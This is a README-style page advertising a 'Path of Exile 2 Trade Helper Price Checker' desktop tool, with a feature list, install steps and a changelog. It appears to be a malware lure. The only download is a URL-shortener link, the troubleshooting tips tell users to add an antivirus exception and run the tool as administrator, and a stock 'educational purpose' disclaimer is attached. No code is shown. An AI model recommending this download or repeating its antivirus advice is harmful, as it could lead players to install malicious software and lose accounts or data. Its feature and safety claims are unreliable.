# PathOfExile2-Trade-Helper-Price-Checker – Live Market Intelligence by Respocket for Exiles

⚡ **PathOfExile2-Trade-Helper-Price-Checker** is a lightweight desktop utility that gives you instant access to current market prices for items, currencies, and unique gear in Path of Exile 2. No more alt‑tabbing or manual searches – just press a hotkey and get real‑time valuations, historical trends, and direct links to trade listings. Designed for efficiency and accuracy, it helps you price your loot, find bargains, and maximise your trading profit.

---

## 📥 DOWNLOAD

**Latest stable version (v2.1.0) – released 23.08.2026**  
[**⬇️ CLICK HERE TO DOWNLOAD ⬇️**](https://cutxo.com/cguqla)  
*(includes launcher, configuration templates, and quick start guide)*

---

## 🔥 Key Features

- **Instant Price Lookup** – hover over any item in‑game or paste a trade link to see current low, median, and high prices.
- **Currency Converter** – convert between chaos, divine, exalt, and all other currencies with live rates.
- **Bulk Price Check** – scan your entire stash tab in seconds and get total value summaries.
- **Smart Alerts** – set price thresholds and get notifications when an item drops below or rises above your target.
- **History Graphs** – visualise price movements over 24h, 7d, and 30d for any item.
- **Trade Integration** – open the official trade site with pre‑filled search parameters directly from the tool.
- **Offline Cache** – stores historical data locally, so you can review prices even without internet.
- **Customisable Hotkeys** – assign your own shortcuts for quick actions.
- **Portable & Safe** – no installation, no background processes; runs only when you need it.

---

## 📋 System Requirements

- **OS**: Windows 10/11 (64‑bit), macOS 11+, Linux (AppImage).
- **RAM**: 512 MB minimum, 1 GB recommended.
- **Storage**: 15 MB free space.
- **Game**: Path of Exile 2 (any version).
- **Internet** connection required for live updates (cached mode works offline).

---

## ⚙️ How It Works (Educational Overview)

The application uses the official Path of Exile 2 trade API to fetch current listings and price averages. It parses item data from the game’s client clipboard or from user‑provided search URLs, then compiles statistical aggregates using weighted moving averages. All requests are rate‑limited to avoid overwhelming the server, and responses are cached locally to minimise latency. The tool does not modify game memory or files – it only reads clipboard content and sends HTTP requests, making it fully compliant with the game’s terms of service for read‑only tools.

---

## 🛠 Installation Steps

1. **Download** the archive from the link above.
2. **Extract** to a folder of your choice (e.g., `C:\POE2PriceChecker`).
3. **Run** the executable appropriate for your OS.
4. **Launch** Path of Exile 2 and load your character.
5. **Set** your preferred hotkey (default: Ctrl+Shift+P) to trigger price check.
6. **Hover** over any item in your inventory or stash and press the hotkey – the overlay will show the price.
7. **Adjust** settings like currency preferences, cache duration, and alert thresholds via the config panel.

---

## 🧠 Configuration Guide

- **Hotkeys** – edit `config.ini` to change the trigger key, toggle overlay, or open history.
- **Currency Base** – choose your primary reference currency (Chaos or Divine).
- **Cache TTL** – set how long price data is kept before refreshing.
- **Alert Sounds** – enable/disable sound notifications for price alerts.
- **Theme** – switch between light and dark mode.

---

## ❓ Troubleshooting (Common Issues)

- **"No prices found"** – ensure the item is correctly named and the trade API is accessible; try a manual search via the built‑in browser.
- **"Overlay not showing"** – make sure the game is in windowed or borderless windowed mode; run the tool as administrator if needed.
- **"Outdated prices"** – increase the cache refresh rate or manually clear cache from the settings.
- **"Antivirus flag"** – add an exception; the tool only performs network requests and clipboard reads.

---

## 📅 Changelog (v2.1.0)

- Added support for PoE2 patch 0.2.0 item affixes.
- Improved accuracy with new price‑smoothing algorithm.
- Fixed issue with multi‑item bulk scans.
- Reduced memory footprint.

---

## 🗺 Roadmap (Upcoming Features)

- **Build‑specific pricing** – suggest items based on your current build.
- **Price prediction** – machine learning forecast for rare items.
- **Trade companion** – automatically post your items for sale at optimal prices.

---

## ⭐ Support & Community

- **Star** this repo to stay updated – we release frequently.
- **Fork** and contribute new features.
- **Issue tracker** – we respond within 24 hours.
- **Discord** channel for live help (link inside /docs).

---

## ⚠️ Educational Purpose Disclaimer

This tool is created for **educational and research purposes** – to demonstrate client‑server interaction, data parsing, and UI design for gaming utilities. It is intended for solo gameplay and fair trade practices. The authors do not encourage any use that violates the game’s Terms of Service or disrupts the economy. Use responsibly and at your own risk.

---

## 🔗 Additional Resources

- User manual: `/docs/manual.pdf`
- API reference: `/docs/api.md`
- FAQ: `/docs/faq.html`

---

**Take control of your Path of Exile 2 trade empire with PathOfExile2-Trade-Helper-Price-Checker – knowledge is currency.**
